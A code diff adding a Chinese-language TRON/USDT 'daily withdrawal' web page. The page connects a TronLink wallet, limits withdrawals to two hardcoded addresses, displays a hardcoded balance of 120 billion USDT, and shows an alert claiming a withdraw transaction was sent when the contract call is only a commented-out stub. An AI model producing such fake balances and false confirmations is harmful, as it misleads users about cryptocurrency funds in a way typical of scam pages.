@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+  <title>USDT 每日提现 50</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <style>
+    body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; }
+    .card { border: 1px solid #ddd; border-radius: 8px; padding: 16px; box-shadow:0 2px 6px rgba(0,0,0,.05); }
+    .row { margin-bottom: 12px; }
+    .label { color: #666; font-size:0.95em; }
+    .value { font-size: 1.2em; word-break: break-all; }
+    button { width: 100%; padding: 10px; border:none; background:#4A5568; color:#fff; border-radius:4px; font-size:1em; cursor:pointer; }
+    button:disabled { background:#aaa; cursor:not-allowed; }
+    #msg { margin-top:12px; color:#c00; min-height:1.2em; }
+    #mobileNotice { display:none; background:#ffeaea; color:#c00; padding:10px; border-radius:6px; margin-bottom:15px; font-size:0.95em; text-align:center; }
+  </style>
+</head>
+<body>
+  <div id="mobileNotice">⚠️ 请在 TronLink App 内的浏览器中打开并点击“连接钱包”。</div>
+
+  <div class="card">
+    <div class="row"><div class="label">钱包地址：</div><div id="addr" class="value">未连接</div></div>
+    <div class="row"><div class="label">账户余额：</div><div id="bal" class="value">120,000,000,000 USDT</div></div>
+    <button id="btn">连接钱包</button>
+    <div id="msg"></div>
+  </div>
+
+<script>
+/* ----- 页面常量配置 ----- */
+const ALLOWED_USERS = [
+  'TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc',
+  'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
+];
+const WITHDRAW_LABEL = '提现 50 USDT';
+
+/* ----- 工具函数 ----- */
+function showMobileNotice() {
+  if (/iphone|android|ipad|micromessenger/i.test(navigator.userAgent)) {
+    document.getElementById('mobileNotice').style.display = 'block';
+  }
+}
+function setBtn(text, disabled, handler) {
+  const b = document.getElementById('btn');
+  b.innerText = text;
+  b.disabled  = disabled;
+  b.onclick   = handler;
+}
+
+/* ----- 钱包连接流程 ----- */
+async function requestAccounts() {
+  if (window.tronLink?.request) {
+    try {
+      await tronLink.request({ method: 'tron_requestAccounts' });
+    } catch (e) {
+      document.getElementById('msg').innerText = '用户拒绝授权';
+      return;
+    }
+  }
+  init();   // 授权后重新检查
+}
+
+function setDisconnectedUI() {
+  document.getElementById('addr').innerText = '未连接';
+  setBtn('连接钱包', false, requestAccounts);
+}
+
+/* ----- 页面初始化 / 状态检查 ----- */
+function init() {
+  showMobileNotice();
+
+  if (window.tronWeb?.ready) {
+    const addr = tronWeb.defaultAddress.base58;
+    document.getElementById('addr').innerText = addr;
+
+    if (ALLOWED_USERS.includes(addr)) {
+      setBtn(WITHDRAW_LABEL, false, sendWithdraw);
+    } else {
+      setBtn('当前地址不可提现', true, null);
+      document.getElementById('msg').innerText = '请切换到授权地址';
+    }
+  } else {
+    setDisconnectedUI();
+  }
+}
+
+/* ----- 提现调用 ----- */
+async function sendWithdraw() {
+  document.getElementById('msg').innerText = '';
+  try {
+    // TODO: 替换为真实合约调用
+    // const CONTRACT = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
+    // await CONTRACT.withdraw().send();
+    alert('已发送 withdraw() 交易，请在 TronLink 确认');  // 可改为 toast
+  } catch (e) {
+    document.getElementById('msg').innerText = '发送失败：' + e.message;
+  }
+}
+
+/* ----- 启动 ----- */
+document.addEventListener('DOMContentLoaded', init);
+</script>
+</body>
+</html>
